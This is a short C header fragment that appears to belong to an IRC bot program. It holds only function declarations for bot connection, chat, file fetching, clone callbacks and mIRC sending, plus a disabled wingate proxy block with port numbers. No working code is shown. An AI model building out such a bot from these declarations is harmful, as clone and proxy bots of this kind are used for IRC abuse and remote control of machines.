void log_debug();
void get_f();
int chat();
int Bot();
void connectbot();
int parse();
void serverout();
void CALLBACK closeid();
int ident();
int identactive();
void privpar();
void Ping();
BOOL GetFile (   CHAR *argQz );
int clonecallback(SOCKET Csock, LPARAM lParam);
void mirc_send( char *parms);
#define IDI_MYICON 500
#define debugg
#undef help
#define oj

#undef onconnect
#undef wingate

#ifdef wingate
#define GATE_LISTEN 9462 // port we listen on
#define WINGATE_PORT 1080 // duh!
#endif
